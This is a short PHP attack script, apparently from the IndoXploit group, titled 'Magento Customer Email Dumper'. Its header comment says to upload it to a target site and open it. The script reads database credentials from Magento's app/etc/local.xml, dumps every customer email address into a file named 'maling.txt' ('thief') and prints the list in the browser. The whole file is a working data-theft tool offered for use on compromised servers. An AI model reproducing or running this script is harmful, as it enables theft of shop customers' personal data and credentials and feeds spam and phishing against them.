<?php
// Magento Customer Email Dumper
// coded by : Mr. Error 404 - IndoXploit
// greetz: res7ock cew - sanjungan jiwa
// how: upload this file to your target -> open this file. (target.com/dumper.php) .
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
$i = 0;
$root = $_SERVER['DOCUMENT_ROOT'];
$path = "/app/etc/local.xml";
$config = file_get_contents($root.$path);
$file = "maling.txt";
$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
$prefix = $dbprefix."customer_entity";
 
function simpan($file, $isi) {
    $f = fopen($file, "w");
    if(@fwrite($f, $isi)) {
        return "<a href='$file' target='_blank'>$file</a>";
    } else {
        return "Gagal simpan file gann.";
    }
    fclose($f);
}
 
mysql_connect($dbhost, $dbuser, $dbpass) or die('MySQL Error: '.mysql_error());
mysql_select_db($dbname) or die('MySQL Error: '.mysql_error());
$q = mysql_query("SELECT email FROM $prefix");
$email = "";
$email_ = "";
while($f = mysql_fetch_array($q)) {
    $i++;
    $email .= $f[email]."\n";
    $email_ .= $f[email]."<br>";
}
echo "Total: <b>".$i."</b> [ ".simpan($file, $email)."] <br><br>
     $email_";
 
?>
